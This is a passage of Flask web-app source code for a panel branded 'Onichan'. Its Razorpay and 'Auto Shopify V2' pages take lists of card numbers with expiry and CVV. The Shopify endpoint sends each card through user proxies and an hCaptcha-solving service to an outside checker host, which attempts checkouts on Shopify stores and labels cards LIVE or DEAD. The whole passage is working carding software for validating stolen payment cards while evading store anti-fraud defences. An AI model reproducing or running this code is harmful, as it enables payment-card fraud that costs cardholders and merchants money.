                +'<div style="background:rgba(59,130,246,0.2);border:1px solid rgba(59,130,246,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#3b82f6;">'+total+'</div><div style="font-size:0.8em;opacity:0.7;">Total</div></div></div>';
            return '<div class="card"><h2 style="margin-bottom:15px;">Results</h2>'+statsHtml+html+'</div>';
        }}

        var rzpLive=0, rzpDead=0, rzpOther=0, rzpTotal=0, rzpProcessed=0, rzpHadError=false;

        function updateStats() {{
            var statsHtml = '<div style="display:flex;gap:15px;flex-wrap:wrap;margin-bottom:20px;">'
                +'<div style="background:rgba(34,197,94,0.2);border:1px solid rgba(34,197,94,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#22c55e;">'+rzpLive+'</div><div style="font-size:0.8em;opacity:0.7;">Live</div></div>'
                +'<div style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#ef4444;">'+rzpDead+'</div><div style="font-size:0.8em;opacity:0.7;">Dead</div></div>'
                +'<div style="background:rgba(245,158,11,0.2);border:1px solid rgba(245,158,11,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#f59e0b;">'+rzpOther+'</div><div style="font-size:0.8em;opacity:0.7;">Other</div></div>'
                +'<div style="background:rgba(59,130,246,0.2);border:1px solid rgba(59,130,246,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#3b82f6;">'+rzpProcessed+'/'+rzpTotal+'</div><div style="font-size:0.8em;opacity:0.7;">Progress</div></div></div>';
            var el = document.getElementById('rzpStats');
            if (el) el.innerHTML = statsHtml;
        }}

        function addCardResult(r) {{
            var cat = r.category||'UNKNOWN';
            if (cat==='LIVE') rzpLive++;
            else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') rzpDead++;
            else rzpOther++;
            rzpProcessed++;
            updateStats();
            var color,icon,bg;
            if (cat==='LIVE') {{ color='#22c55e'; icon='&#10003;'; bg='rgba(34,197,94,0.15)'; }}
            else if (cat==='DEAD'||cat==='DECLINED'||cat==='EXPIRED') {{ color='#ef4444'; icon='&#10007;'; bg='rgba(239,68,68,0.15)'; }}
            else if (cat==='RISK') {{ color='#a855f7'; icon='&#9888;'; bg='rgba(168,85,247,0.15)'; }}
            else {{ color='#f59e0b'; icon='&#8264;'; bg='rgba(245,158,11,0.15)'; }}
            var html = '<div class="card-result" style="background:'+bg+';border-left:3px solid '+color+';padding:12px 15px;margin-bottom:8px;border-radius:0 8px 8px 0;">'
                +'<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">'
                +'<div><span style="color:'+color+';font-weight:bold;font-size:1.1em;">'+icon+'</span>'
                +'<code style="margin-left:8px;font-size:0.95em;">'+escapeHtml(r.masked||'N/A')+'</code></div>'
                +'<span style="color:'+color+';font-weight:600;font-size:0.85em;">'+cat+' ['+rzpProcessed+'/'+rzpTotal+']</span></div>'
                +'<div style="margin-top:6px;font-size:0.85em;opacity:0.85;">'+escapeHtml(r.message||'N/A')+'</div>'
                +'<div style="margin-top:4px;font-size:0.8em;opacity:0.65;display:flex;gap:15px;flex-wrap:wrap;">'
                +'<span>'+escapeHtml(r.scheme||'N/A')+'</span><span>'+escapeHtml(r.bank||'N/A')+'</span>'
                +'<span>'+escapeHtml(r.country||'N/A')+'</span><span>'+(r.time||0)+'s</span></div></div>';
            var container = document.getElementById('rzpResults');
            if (container) container.insertAdjacentHTML('beforeend', html);
            var progressBar = document.getElementById('progressBar');
            if (progressBar && rzpTotal > 0) progressBar.style.width = Math.round((rzpProcessed/rzpTotal)*100)+'%';
        }}

        function startCheck(e) {{
            e.preventDefault();
            var btn = document.getElementById('checkBtn');
            var btnText = document.getElementById('btnText');
            var progressWrap = document.getElementById('progressWrap');
            var progressBar = document.getElementById('progressBar');
            var resultArea = document.getElementById('resultArea');

            btn.classList.add('btn-checking');
            btnText.innerHTML = '<span class="spinner"></span> Initializing...';
            progressWrap.style.display = 'block';
            progressBar.style.width = '0%';
            rzpLive=0; rzpDead=0; rzpOther=0; rzpTotal=0; rzpProcessed=0; rzpHadError=false;
            resultArea.innerHTML = '<div class="card"><h2 style="margin-bottom:15px;">Results</h2><div id="rzpStats"></div><div id="rzpStatusMsg" style="padding:8px;margin-bottom:10px;font-size:0.9em;opacity:0.7;"></div><div id="rzpResults"></div></div>';

            var formData = new FormData(document.getElementById('rzpForm'));

            fetch('/api/check/razorpay', {{ method:'POST', body:formData }})
            .then(function(resp) {{
                if (!resp.ok) {{
                    return resp.json().then(function(d) {{
                        throw new Error(d.error || 'Server error');
                    }});
                }}
                var reader = resp.body.getReader();
                var decoder = new TextDecoder();
                var buffer = '';

                function processChunk() {{
                    return reader.read().then(function(result) {{
                        if (result.done) {{
                            progressBar.style.width = '100%';
                            setTimeout(function() {{ progressWrap.style.display='none'; }}, 400);
                            btn.classList.remove('btn-checking');
                            btnText.textContent = 'Start Checking';
                            if (!rzpHadError) {{
                                var statusEl = document.getElementById('rzpStatusMsg');
                                if (statusEl) {{
                                    if (rzpProcessed > 0) {{
                                        statusEl.innerHTML = '<span style="color:#22c55e;">All ' + rzpProcessed + ' card(s) processed!</span>';
                                    }} else {{
                                        statusEl.innerHTML = '<span style="color:#f59e0b;">No card results received. Check your inputs and try again.</span>';
                                    }}
                                }}
                            }}
                            return;
                        }}
                        buffer += decoder.decode(result.value, {{stream: true}});
                        var lines = buffer.split('\\n');
                        buffer = lines.pop();
                        for (var li = 0; li < lines.length; li++) {{
                            var line = lines[li].trim();
                            if (!line.startsWith('data: ')) continue;
                            try {{
                                var evt = JSON.parse(line.substring(6));
                                if (evt.type === 'status') {{
                                    btnText.innerHTML = '<span class="spinner"></span> ' + escapeHtml(evt.message);
                                    var statusEl = document.getElementById('rzpStatusMsg');
                                    if (statusEl) statusEl.textContent = evt.message;
                                }} else if (evt.type === 'init') {{
                                    rzpTotal = evt.total;
                                    btnText.innerHTML = '<span class="spinner"></span> Checking 0/' + rzpTotal;
                                    updateStats();
                                }} else if (evt.type === 'result') {{
                                    addCardResult(evt.data);
                                    btnText.innerHTML = '<span class="spinner"></span> Checking ' + rzpProcessed + '/' + rzpTotal;
                                }} else if (evt.type === 'error') {{
                                    rzpHadError = true;
                                    var statusEl = document.getElementById('rzpStatusMsg');
                                    if (statusEl) statusEl.innerHTML = '<span style="color:#ef4444;">Error: ' + escapeHtml(evt.message) + '</span>';
                                    btn.classList.remove('btn-checking');
                                    btnText.textContent = 'Start Checking';
                                    progressWrap.style.display = 'none';
                                }} else if (evt.type === 'done') {{
                                    progressBar.style.width = '100%';
                                }}
                            }} catch(parseErr) {{}}
                        }}
                        return processChunk();
                    }});
                }}
                return processChunk();
            }})
            .catch(function(err) {{
                progressWrap.style.display='none';
                btn.classList.remove('btn-checking');
                btnText.textContent = 'Start Checking';
                resultArea.innerHTML = '<div class="alert alert-danger">'+escapeHtml(err.message||'Network error')+'</div>';
            }});
            return false;
        }}
        </script>
    </body>
    </html>
    """)


@app.route('/api/check/shopify', methods=['POST'])
@user_required
def api_check_shopify():
    """API endpoint for Shopify V2 checking - SSE streaming"""
    from flask import Response, stream_with_context
    import json as _json
    import traceback as _tb
    import requests as _requests
    import time as _time
    MAX_CARDS = 25
    cards_text = request.form.get('cards', '').strip()
    gate_type = request.form.get('gate_type', 'auto').strip()
    custom_site = request.form.get('custom_site', '').strip()
    proxy_text = request.form.get('proxy', '').strip()
    solve_captcha = request.form.get('solvecap', '').strip().lower() == 'true'
    nopecha_key = request.form.get('nopechakey', '').strip()

    if not cards_text:
        return jsonify({"error": "Please enter card details"}), 400

    card_lines = [c.strip() for c in cards_text.split('\n') if c.strip()]
    if len(card_lines) > MAX_CARDS:
        card_lines = card_lines[:MAX_CARDS]

    if gate_type == 'custom' and not custom_site:
        return jsonify({"error": "Please enter a Shopify site URL for custom mode"}), 400

    def parse_card(line):
        line = line.replace(' ', '|').replace('/', '|')
        parts = line.split('|')
        if len(parts) >= 4:
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            if len(year) == 2:
                year = '20' + year
            return f"{cc}|{month}|{year}|{cvv}"
        return None

    def generate():
        total = len(card_lines)
        yield f"data: {_json.dumps({'type': 'init', 'total': total})}\n\n"
        yield f"data: {_json.dumps({'type': 'status', 'message': 'Starting Shopify checker...'})}\n\n"

        for idx, raw_card in enumerate(card_lines):
            card = parse_card(raw_card)
            if not card:
                yield f"data: {_json.dumps({'type': 'result', 'data': {'masked': raw_card[:20], 'category': 'ERROR', 'message': 'Invalid card format', 'gateway': 'N/A', 'price': 'N/A', 'ip': 'N/A', 'time': '0s'}})}\n\n"
                continue

            yield f"data: {_json.dumps({'type': 'status', 'message': f'Checking card {idx+1}/{total}...'})}\n\n"

            try:
                params = {'cc': card}
                if gate_type == 'custom' and custom_site:
                    params['site'] = custom_site
                if solve_captcha:
                    params['solvecap'] = 'true'
                    if nopecha_key:
                        params['nopechakey'] = nopecha_key
                if proxy_text:
                    proxy_parts = proxy_text.replace('@', ':').split(':')
                    if len(proxy_parts) == 4:
                        params['proxy'] = f"{proxy_parts[0]}:{proxy_parts[1]}:{proxy_parts[2]}:{proxy_parts[3]}"
                    elif len(proxy_parts) == 2:
                        params['proxy'] = f"{proxy_parts[0]}:{proxy_parts[1]}"
                    else:
                        params['proxy'] = proxy_text

                session = _requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                })
                start_t = _time.time()
                resp = session.get('http://sh.wasvictus.com/', params=params, timeout=180, allow_redirects=True)
                elapsed = round(_time.time() - start_t, 2)

                cc_parts = card.split('|')
                masked = cc_parts[0][:6] + 'xxxxxx' + cc_parts[0][-4:] + '|' + cc_parts[1] + '|' + cc_parts[2] + '|***' if len(cc_parts) >= 4 else card[:20]

                if resp.status_code == 200:
                    try:
                        data = resp.json()
                    except:
                        yield f"data: {_json.dumps({'type': 'result', 'data': {'masked': masked, 'category': 'ERROR', 'message': 'Invalid API response', 'gateway': 'N/A', 'price': 'N/A', 'ip': 'N/A', 'time': str(elapsed) + 's'}})}\n\n"
                        continue

                    result_val = data.get('Result', 'ERROR')
                    raw_response = data.get('Response', 'No response')
                    gateway = data.get('Gateway', 'N/A')
                    price = data.get('Price', 'N/A')
                    ip_used = data.get('ip', 'N/A')
                    time_taken = data.get('time_taken', str(elapsed) + 's')

                    RESPONSE_MAP = {
                        'GENERIC_ERROR': 'Generic Decline',
                        'GENERIC_DECLINE': 'Generic Decline',
                        'INSUFFICIENT_FUNDS': 'Insufficient Funds',
                        'INVALID_CARD': 'Invalid Card Number',
                        'INVALID_NUMBER': 'Invalid Card Number',
                        'EXPIRED_CARD': 'Expired Card',
                        'CARD_EXPIRED': 'Expired Card',
                        'INCORRECT_CVC': 'Incorrect CVV/CVC',
                        'INCORRECT_CVV': 'Incorrect CVV/CVC',
                        'CVV_MISMATCH': 'CVV Mismatch',
                        'CVC_CHECK_FAILED': 'CVV Check Failed',
                        'DO_NOT_HONOR': 'Do Not Honor',
                        'STOLEN_CARD': 'Stolen Card',
                        'LOST_CARD': 'Lost Card',
                        'PICKUP_CARD': 'Pick Up Card',
                        'FRAUDULENT': 'Suspected Fraud',
                        'FRAUD': 'Suspected Fraud',
                        'CARD_DECLINED': 'Card Declined',
                        'PROCESSING_ERROR': 'Processing Error',
                        'CALL_ISSUER': 'Call Issuer',
                        'RESTRICTED_CARD': 'Restricted Card',
                        'SECURITY_VIOLATION': 'Security Violation',
                        'TRANSACTION_NOT_ALLOWED': 'Transaction Not Allowed',
                        'NOT_PERMITTED': 'Not Permitted',
                        'INVALID_AMOUNT': 'Invalid Amount',
                        'INVALID_EXPIRY': 'Invalid Expiry Date',
                        'INVALID_EXPIRY_DATE': 'Invalid Expiry Date',
                        'INVALID_EXPIRY_YEAR': 'Invalid Expiry Year',
                        'INVALID_EXPIRY_MONTH': 'Invalid Expiry Month',
                        'LIMIT_EXCEEDED': 'Limit Exceeded',
                        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'Withdrawal Limit Exceeded',
                        'CAPTCHA_REQUIRED': 'Captcha Required (Enable Solver)',
                        'MISSING_SITE': 'Missing Site URL',
                        'Missing site': 'Missing Site URL',
                        'RATE_LIMITED': 'Rate Limited - Try Later',
                        'APPROVED': 'Approved - Charged',
                        'ORDER_CONFIRMED': 'Order Confirmed - Charged',
                        'AUTHENTICATION_REQUIRED': '3DS Auth Required',
                        'THREE_D_SECURE_REQUIRED': '3DS Auth Required',
                        'AVS_MISMATCH': 'Address Verification Failed',
                        'POSTAL_CODE_INVALID': 'Invalid Postal/Zip Code',
                        'CURRENCY_NOT_SUPPORTED': 'Currency Not Supported',
                        'TESTMODE_DECLINE': 'Test Mode Decline',
                        'TRY_AGAIN_LATER': 'Try Again Later',
                        'REVOCATION_OF_ALL_AUTHORIZATIONS': 'All Authorizations Revoked',
                        'REENTER_TRANSACTION': 'Re-enter Transaction',
                        'NO_ACTION_TAKEN': 'No Action Taken',
                        'Security Block': 'Security Block',
                    }
                    response_msg = RESPONSE_MAP.get(raw_response, raw_response)

                    if result_val in ('APPROVED', 'ORDER_CONFIRMED'):
                        category = 'LIVE'
                    elif result_val in ('DECLINED', 'BAD'):
                        category = 'DEAD'
                    elif result_val == 'ERROR':
                        category = 'ERROR'
                    else:
                        category = 'ERROR'

                    yield f"data: {_json.dumps({'type': 'result', 'data': {'masked': masked, 'category': category, 'message': response_msg, 'gateway': gateway, 'price': price, 'ip': ip_used, 'time': time_taken}})}\n\n"
                else:
                    yield f"data: {_json.dumps({'type': 'result', 'data': {'masked': masked, 'category': 'ERROR', 'message': f'HTTP {resp.status_code}', 'gateway': 'N/A', 'price': 'N/A', 'ip': 'N/A', 'time': str(elapsed) + 's'}})}\n\n"

            except Exception as e:
                cc_parts = card.split('|') if '|' in card else [card]
                masked = cc_parts[0][:6] + 'xxxxxx' + cc_parts[0][-4:] if len(cc_parts) >= 1 and len(cc_parts[0]) > 10 else raw_card[:20]
                yield f"data: {_json.dumps({'type': 'result', 'data': {'masked': masked, 'category': 'ERROR', 'message': str(e)[:200], 'gateway': 'N/A', 'price': 'N/A', 'ip': 'N/A', 'time': '0s'}})}\n\n"

        yield f"data: {_json.dumps({'type': 'done', 'message': 'All cards processed'})}\n\n"

    return Response(stream_with_context(generate()), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no',
        'Connection': 'keep-alive'
    })


@app.route('/user/shopify', methods=['GET'])
@user_required
def user_shopify():
    """Auto Shopify V2 - Check cards through Shopify gates"""
    return render_template_string(f"""
    <html>
    <head><title>Auto Shopify V2 - Onichan</title>{USER_CSS}
    <style>
        @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
        @keyframes pulse {{ 0%,100%{{opacity:1}} 50%{{opacity:.5}} }}
        .spinner {{ width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #fff;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px; }}
        .btn-checking {{ pointer-events:none;opacity:0.85;position:relative; }}
        .progress-bar-wrap {{ background:rgba(255,255,255,0.1);border-radius:8px;height:6px;margin-top:12px;overflow:hidden;display:none; }}
        .progress-bar-fill {{ height:100%;background:linear-gradient(90deg,#ec4899,#8b5cf6,#3b82f6);border-radius:8px;transition:width 0.3s ease;width:0%; }}
        .card-result {{ animation:slideIn 0.3s ease-out; }}
        @keyframes slideIn {{ from{{opacity:0;transform:translateY(10px)}} to{{opacity:1;transform:translateY(0)}} }}
        .gate-type-selector {{ display:flex; gap:0; border-radius:10px; overflow:hidden; border:1px solid rgba(255,255,255,0.1); }}
        .gate-type-option {{ flex:1; padding:14px 20px; text-align:center; cursor:pointer; background:rgba(255,255,255,0.05); transition:all 0.3s ease; font-size:0.95em; position:relative; }}
        .gate-type-option:hover {{ background:rgba(255,255,255,0.1); }}
        .gate-type-option.active {{ background:rgba(139,92,246,0.3); border-color:rgba(139,92,246,0.5); }}
        .gate-type-option input {{ display:none; }}
        .gate-type-option .radio-dot {{ width:20px; height:20px; border-radius:50%; border:2px solid rgba(255,255,255,0.3); display:inline-block; vertical-align:middle; margin-left:10px; position:relative; }}
        .gate-type-option.active .radio-dot {{ border-color:#8b5cf6; }}
        .gate-type-option.active .radio-dot::after {{ content:''; position:absolute; top:4px; left:4px; width:8px; height:8px; border-radius:50%; background:#8b5cf6; }}
        .custom-site-field {{ display:none; margin-top:12px; animation:slideIn 0.3s ease-out; }}
        .custom-site-field.show {{ display:block; }}
    </style>
    </head>
    <body>
        {get_user_sidebar('shopify', 'Auto Shopify V2')}
        <div class="main">
            <div class="header">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="width: 40px; height: 40px; background: linear-gradient(135deg, #8b5cf6, #6d28d9); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 1.3em;">&#128722;</div>
                    <div>
                        <h1 style="margin: 0; font-size: 1.3em;">Auto Shopify</h1>
                        <p style="margin: 0; opacity: 0.6; font-size: 0.85em;">Check cards through Shopify gates</p>
                    </div>
                </div>
            </div>

            <form id="shopForm" onsubmit="return startShopifyCheck(event)">
                <div class="card">
                    <h2>Card Details</h2>
                    <div class="form-group">
                        <textarea name="cards" id="shopCards" rows="6" placeholder="Paste cards in any format&#10;4111111111111111|12|25|123" style="font-family: monospace;"></textarea>
                    </div>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <button type="button" class="btn btn-secondary" onclick="formatShopCards()" style="font-size: 0.85em;">Format</button>
                        <label class="btn btn-secondary" style="font-size: 0.85em; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                            &#8593; Upload
                            <input type="file" accept=".txt" onchange="loadShopFile(this)" style="display: none;">
                        </label>
                        <button type="button" class="btn btn-secondary" onclick="downloadResults()" style="font-size: 0.85em;">&#8595; Download</button>
                    </div>
                </div>

                <div class="card">
                    <h2>Gate Type</h2>
                    <div class="gate-type-selector">
                        <label class="gate-type-option active" id="opt-auto" onclick="selectGateType('auto')">
                            <input type="radio" name="gate_type" value="auto" checked>
                            PreConfiged (Auto Sites)
                            <span class="radio-dot"></span>
                        </label>
                        <label class="gate-type-option" id="opt-custom" onclick="selectGateType('custom')">
                            <input type="radio" name="gate_type" value="custom">
                            Custom Sites
                            <span class="radio-dot"></span>
                        </label>
                    </div>
                    <div class="custom-site-field" id="customSiteField">
                        <div class="form-group">
                            <input type="text" name="custom_site" id="customSiteInput" placeholder="https://example-store.myshopify.com">
                        </div>
                    </div>
                </div>

                <div class="card">
                    <h2>Proxy</h2>
                    <div class="form-group">
                        <input type="text" name="proxy" placeholder="ip:port or user:pass@ip:port (optional)">
                    </div>
                </div>

                <div class="card">
                    <h2>Captcha Solver</h2>
                    <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;">
                        <label style="display:flex;align-items:center;gap:8px;cursor:pointer;">
                            <input type="checkbox" id="solvecapToggle" name="solvecap" value="true" style="width:18px;height:18px;accent-color:#8b5cf6;cursor:pointer;">
                            <span style="font-size:0.95em;">Enable hCaptcha Solving</span>
                        </label>
                    </div>
                    <div id="nopechaField" style="display:none;">
                        <div class="form-group">
                            <input type="text" name="nopechakey" id="nopechaKeyInput" placeholder="NopeCHA subscription key (sub_yourkey)">
                        </div>
                        <p style="font-size:0.8em;opacity:0.5;margin-top:6px;">Required for captcha solving. Get your key from nopecha.com</p>
                    </div>
                </div>

                <button type="submit" id="shopCheckBtn" class="btn btn-primary" style="width: 100%; padding: 14px; font-size: 1.05em; margin-bottom: 10px;">
                    <span id="shopBtnText">Check Cards</span>
                </button>
                <div class="progress-bar-wrap" id="shopProgressWrap">
                    <div class="progress-bar-fill" id="shopProgressBar"></div>
                </div>
            </form>

            <div id="shopResultArea" style="margin-top: 20px;"></div>
        </div>

        <script>
        var shopLive=0, shopDead=0, shopOther=0, shopTotal=0, shopProcessed=0, shopHadError=false;
        var shopAllResults = [];

        function saveSettings() {{
            localStorage.setItem('shop_proxy', document.querySelector('input[name="proxy"]').value);
            localStorage.setItem('shop_custom_site', document.getElementById('customSiteInput').value);
            localStorage.setItem('shop_nopecha_key', document.getElementById('nopechaKeyInput').value);
            localStorage.setItem('shop_gate_type', document.querySelector('input[name="gate_type"]:checked').value);
            localStorage.setItem('shop_solvecap', document.getElementById('solvecapToggle').checked ? 'true' : 'false');
        }}

        function selectGateType(type) {{
            document.getElementById('opt-auto').classList.toggle('active', type==='auto');
            document.getElementById('opt-custom').classList.toggle('active', type==='custom');
            document.getElementById('customSiteField').classList.toggle('show', type==='custom');
            if (type==='auto') document.querySelector('input[value="auto"]').checked = true;
            else document.querySelector('input[value="custom"]').checked = true;
        }}

        (function loadSaved() {{
            var proxy = localStorage.getItem('shop_proxy');
            var site = localStorage.getItem('shop_custom_site');
            var nkey = localStorage.getItem('shop_nopecha_key');
            var gate = localStorage.getItem('shop_gate_type');
            var cap = localStorage.getItem('shop_solvecap');
            if (proxy) document.querySelector('input[name="proxy"]').value = proxy;
            if (site) document.getElementById('customSiteInput').value = site;
            if (nkey) document.getElementById('nopechaKeyInput').value = nkey;
            if (cap === 'true') {{
                document.getElementById('solvecapToggle').checked = true;
                document.getElementById('nopechaField').style.display = 'block';
            }}
            if (gate === 'custom') selectGateType('custom');
        }})();

        document.getElementById('solvecapToggle').addEventListener('change', function() {{
            document.getElementById('nopechaField').style.display = this.checked ? 'block' : 'none';
            saveSettings();
        }});
        document.querySelector('input[name="proxy"]').addEventListener('input', saveSettings);
        document.getElementById('customSiteInput').addEventListener('input', saveSettings);
        document.getElementById('nopechaKeyInput').addEventListener('input', saveSettings);

        function formatShopCards() {{
            var ta = document.getElementById('shopCards');
            var lines = ta.value.split('\\n');
            var formatted = [];
            for (var i = 0; i < lines.length; i++) {{
                var line = lines[i].trim();
                if (!line) continue;
                line = line.replace(/\\s+/g, '|').replace(/\\//g, '|');
                var parts = line.split('|');
                if (parts.length >= 4) formatted.push(parts[0]+'|'+parts[1]+'|'+parts[2]+'|'+parts[3]);
                else formatted.push(line);
            }}
            ta.value = formatted.join('\\n');
        }}

        function loadShopFile(input) {{
            if (input.files && input.files[0]) {{
                var reader = new FileReader();
                reader.onload = function(e) {{ document.getElementById('shopCards').value = e.target.result; }};
                reader.readAsText(input.files[0]);
            }}
        }}

        function downloadResults() {{
            if (shopAllResults.length === 0) {{ alert('No results to download'); return; }}
            var lines = [];
            for (var i = 0; i < shopAllResults.length; i++) {{
                var r = shopAllResults[i];
                lines.push(r.category + ' | ' + r.masked + ' | ' + r.message + ' | ' + (r.gateway||'') + ' | Price: ' + (r.price||'') + ' | IP: ' + (r.ip||'') + ' | ' + (r.time||''));
            }}
            var blob = new Blob([lines.join('\\n')], {{type: 'text/plain'}});
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'shopify_results.txt';
            a.click();
        }}

        function escapeHtml(t) {{ var d=document.createElement('div'); d.textContent=t; return d.innerHTML; }}

        function updateShopStats() {{
            var statsHtml = '<div style="display:flex;gap:15px;flex-wrap:wrap;margin-bottom:20px;">'
                +'<div style="background:rgba(34,197,94,0.2);border:1px solid rgba(34,197,94,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#22c55e;">'+shopLive+'</div><div style="font-size:0.8em;opacity:0.7;">Live</div></div>'
                +'<div style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#ef4444;">'+shopDead+'</div><div style="font-size:0.8em;opacity:0.7;">Dead</div></div>'
                +'<div style="background:rgba(245,158,11,0.2);border:1px solid rgba(245,158,11,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#f59e0b;">'+shopOther+'</div><div style="font-size:0.8em;opacity:0.7;">Error</div></div>'
                +'<div style="background:rgba(59,130,246,0.2);border:1px solid rgba(59,130,246,0.3);padding:10px 20px;border-radius:8px;text-align:center;">'
                +'<div style="font-size:1.5em;font-weight:bold;color:#3b82f6;">'+shopProcessed+'/'+shopTotal+'</div><div style="font-size:0.8em;opacity:0.7;">Progress</div></div></div>';
            var el = document.getElementById('shopStats');
            if (el) el.innerHTML = statsHtml;
        }}

        function addShopResult(r) {{
            shopAllResults.push(r);
            var cat = r.category||'UNKNOWN';
            if (cat==='LIVE') shopLive++;
            else if (cat==='DEAD'||cat==='DECLINED') shopDead++;
            else shopOther++;
            shopProcessed++;
            updateShopStats();
            var color,icon,bg;
            if (cat==='LIVE') {{ color='#22c55e'; icon='&#10003;'; bg='rgba(34,197,94,0.15)'; }}
            else if (cat==='DEAD'||cat==='DECLINED') {{ color='#ef4444'; icon='&#10007;'; bg='rgba(239,68,68,0.15)'; }}
            else {{ color='#f59e0b'; icon='&#8264;'; bg='rgba(245,158,11,0.15)'; }}
            var html = '<div class="card-result" style="background:'+bg+';border-left:3px solid '+color+';padding:12px 15px;margin-bottom:8px;border-radius:0 8px 8px 0;">'
                +'<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">'
                +'<div><span style="color:'+color+';font-weight:bold;font-size:1.1em;">'+icon+'</span>'
                +'<code style="margin-left:8px;font-size:0.95em;">'+escapeHtml(r.masked||'N/A')+'</code></div>'
                +'<span style="color:'+color+';font-weight:600;font-size:0.85em;">'+cat+' ['+shopProcessed+'/'+shopTotal+']</span></div>'
                +'<div style="margin-top:6px;font-size:0.85em;opacity:0.85;">'+escapeHtml(r.message||'N/A')+'</div>'
                +'<div style="margin-top:4px;font-size:0.8em;opacity:0.65;display:flex;gap:15px;flex-wrap:wrap;">'
                +'<span>'+escapeHtml(r.gateway||'N/A')+'</span><span>Price: '+escapeHtml(r.price||'N/A')+'</span>'
                +'<span>IP: '+escapeHtml(r.ip||'N/A')+'</span><span>'+escapeHtml(r.time||'0')+'</span></div></div>';
            var container = document.getElementById('shopResults');
            if (container) container.insertAdjacentHTML('beforeend', html);
            var progressBar = document.getElementById('shopProgressBar');
            if (progressBar && shopTotal > 0) progressBar.style.width = Math.round((shopProcessed/shopTotal)*100)+'%';
        }}

        function startShopifyCheck(e) {{
            e.preventDefault();
            var btn = document.getElementById('shopCheckBtn');
            var btnText = document.getElementById('shopBtnText');
            var progressWrap = document.getElementById('shopProgressWrap');
            var progressBar = document.getElementById('shopProgressBar');
            var resultArea = document.getElementById('shopResultArea');

            btn.classList.add('btn-checking');
            btnText.innerHTML = '<span class="spinner"></span> Initializing...';
            progressWrap.style.display = 'block';
            progressBar.style.width = '0%';
            shopLive=0; shopDead=0; shopOther=0; shopTotal=0; shopProcessed=0; shopHadError=false;
            shopAllResults = [];
            resultArea.innerHTML = '<div class="card"><h2 style="margin-bottom:15px;">Results</h2><div id="shopStats"></div><div id="shopStatusMsg" style="padding:8px;margin-bottom:10px;font-size:0.9em;opacity:0.7;"></div><div id="shopResults"></div></div>';

            var formData = new FormData(document.getElementById('shopForm'));

            fetch('/api/check/shopify', {{ method:'POST', body:formData }})
            .then(function(resp) {{
                if (!resp.ok) {{
                    return resp.json().then(function(d) {{
                        throw new Error(d.error || 'Server error');
                    }});
                }}
                var reader = resp.body.getReader();
                var decoder = new TextDecoder();
                var buffer = '';

                function processChunk() {{
                    return reader.read().then(function(result) {{
                        if (result.done) {{
                            progressBar.style.width = '100%';
                            setTimeout(function() {{ progressWrap.style.display='none'; }}, 400);
                            btn.classList.remove('btn-checking');
                            btnText.textContent = 'Check Cards';
                            if (!shopHadError) {{
                                var statusEl = document.getElementById('shopStatusMsg');
                                if (statusEl) {{
                                    if (shopProcessed > 0) {{
                                        statusEl.innerHTML = '<span style="color:#22c55e;">All ' + shopProcessed + ' card(s) processed!</span>';
                                    }} else {{
                                        statusEl.innerHTML = '<span style="color:#f59e0b;">No card results received. Check your inputs and try again.</span>';
                                    }}
                                }}
                            }}
                            return;
                        }}
                        buffer += decoder.decode(result.value, {{stream: true}});
                        var lines = buffer.split('\\n');
                        buffer = lines.pop();
                        for (var li = 0; li < lines.length; li++) {{
                            var line = lines[li].trim();
                            if (!line.startsWith('data: ')) continue;
                            try {{
                                var evt = JSON.parse(line.substring(6));
                                if (evt.type === 'status') {{
                                    btnText.innerHTML = '<span class="spinner"></span> ' + escapeHtml(evt.message);
                                    var statusEl = document.getElementById('shopStatusMsg');
                                    if (statusEl) statusEl.textContent = evt.message;
                                }} else if (evt.type === 'init') {{
                                    shopTotal = evt.total;
                                    btnText.innerHTML = '<span class="spinner"></span> Checking 0/' + shopTotal;
                                    updateShopStats();
                                }} else if (evt.type === 'result') {{
                                    addShopResult(evt.data);
                                    btnText.innerHTML = '<span class="spinner"></span> Checking ' + shopProcessed + '/' + shopTotal;
                                }} else if (evt.type === 'error') {{
                                    shopHadError = true;
                                    var statusEl = document.getElementById('shopStatusMsg');
                                    if (statusEl) statusEl.innerHTML = '<span style="color:#ef4444;">Error: ' + escapeHtml(evt.message) + '</span>';
                                    btn.classList.remove('btn-checking');
                                    btnText.textContent = 'Check Cards';
                                    progressWrap.style.display = 'none';
                                }} else if (evt.type === 'done') {{
